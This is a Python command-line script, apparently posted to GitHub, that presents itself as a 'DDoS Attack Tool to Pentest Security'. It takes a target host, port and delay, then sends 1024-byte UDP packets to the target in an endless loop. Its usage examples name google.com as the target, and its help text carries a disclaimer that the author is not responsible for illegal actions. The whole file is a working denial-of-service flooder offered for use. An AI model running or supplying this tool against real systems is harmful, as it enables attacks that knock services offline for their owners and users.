import socket
import sys
import time

default_port = 80

def check_int(numero):
    if numero.isnumeric() == True:
        numero = int(numero)
    else:
        return False

def help_menu():
     print("HOW TO USE: type your target using his IP or DNS address. DON'T USE 'https://'.\nNow it's juts start your attack. I'm just a cybersecurity student, and I'm not responsible for any illegal actions taken!")
     print("\nUse g00dby3.py -h to access help.")
     print("""
     [+] COMAND [+]        |       [+] FUNCTION [+]\n
     -add                  |       Recive a target to attack. [g00dby3.py -add www.google.com]\n
     -p                    |       Receive a specific door to start the attack. If you don't set port, the script will
                                   use a default port [g00dby3.py -add www.google.com -p 80]\n
     -v                    |       Receive the speed you wish to perform the attack. If you don't use this argument, the script will use
                                   the default speed. [g00dby3.py -add www.google.com -p 80 -v 2]     
     """)


print("""

                ,a8888a,        ,a8888a,              88  88                       ad888888b,  
              ,8P"'  `"Y8,    ,8P"'  `"Y8,            88  88                      d8"     "88  
             ,8P        Y8,  ,8P        Y8,           88  88                              a8P  
 ,adPPYb,d8  88          88  88          88   ,adPPYb,88  88,dPPYba,   8b       d8     aad8"   
a8"    `Y88  88          88  88          88  a8"    `Y88  88P'    "8a  `8b     d8'     ""Y8,   
8b       88  `8b        d8'  `8b        d8'  8b       88  88       d8   `8b   d8'         "8b  
"8a,   ,d88   `8ba,  ,ad8'    `8ba,  ,ad8'   "8a,   ,d88  88b,   ,a8"    `8b,d8'  Y8,     a88  
 `"YbbdP"Y8     "Y8888P"        "Y8888P"      `"8bbdP"Y8  8Y"Ybbd8"'       Y88'    "Y888888P'  
 aa,    ,88                                                                d8'                 
  "Y8bbdP"                                                                d8'                  
     """)
print("[!] Made by: github.com/titiomathias/ [!]")
print("[+] DDoS Attack Tool to Pentest Security [+]")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = bytes(1024)

arg = sys.argv
index = len(arg)

if index == 1:
     help_menu()

# Opção de endereço selecionada faltando argumento
if index == 2:
     if arg[1] == "-add":
          print("\nERROR - Address not typed.")
          print("Type what target you wanna attack. [g00dby3.py -add google.com]")
     else:
          help_menu()

#Script padrão rodando
if index == 3:
     if arg[1] == "-add":
          add = arg[2]
          sent = 0
          while 1 == 1:
               sock.sendto(bytes, (add, default_port))
               print(f"{sent} pacotes enviados para {add} na porta {default_port}. Ataque em progresso!")
               sent+=1
     else:
          help_menu()

# Opção porta selecionada faltando argumento
if index == 4:
     if arg[1] == "-add":
          if arg[3] == "-p":
               print("Type what port you wanna attack. [g00dby3.py -add google.com -p 443]")
          else:
               help_menu()
     else:
          help_menu()

if index == 5:
     if arg[1] == "-add":
          add = arg[2]
          if arg[3] == "-p":
               port = arg[4]
               if port.isnumeric() == True:
                    port = int(port)
                    sent = 0
                    while 1 == 1:
                         sock.sendto(bytes, (add, port))
                         print(f"{sent} pacotes enviados para {add} na porta {port}. Ataque em progresso!")
                         sent+=1
               else:
                    print("Type a integer value in port. [g00dby3.py -add google.com -p 443]")
          else:
               help_menu()
     else:
          help_menu()

if index == 6:
     if arg[1] == "-add":
          add = arg[2]
          if arg[3] == "-p":
               if arg[5] == "-v":
                    print("Type in seconds to start your attack. [g00dby3.py -add google.com -p 443 -v 2]")
               else:
                    help_menu()
          else:
               help_menu()
     else:
          help_menu()

if index == 7:
     if arg[1] == "-add":
          add = arg[2]
          if arg[3] == "-p":
               port = arg[4]
               if port.isnumeric() == True:
                    port = int(port)
                    if arg[5] == "-v":
                         v = arg[6]
                         if v.isnumeric() == True:
                              v = int(v)
                              sent = 0
                              while 1 == 1:
                                   sock.sendto(bytes, (add, port))
                                   print(f"{sent} pacotes enviados para {add} na porta {port}. Ataque em progresso!")
                                   time.sleep(v)
                                   sent+=1
                         else:
                              print("Type a integer number to velocity. [g00dby3.py -add google.com -p 443 -v 2]")
                    else:
                         help_menu()
               else:
                    print("Type a integer number to port. [g00dby3.py -add google.com -p 443 -v 2]")
          else:
               help_menu()
     else:
          help_menu()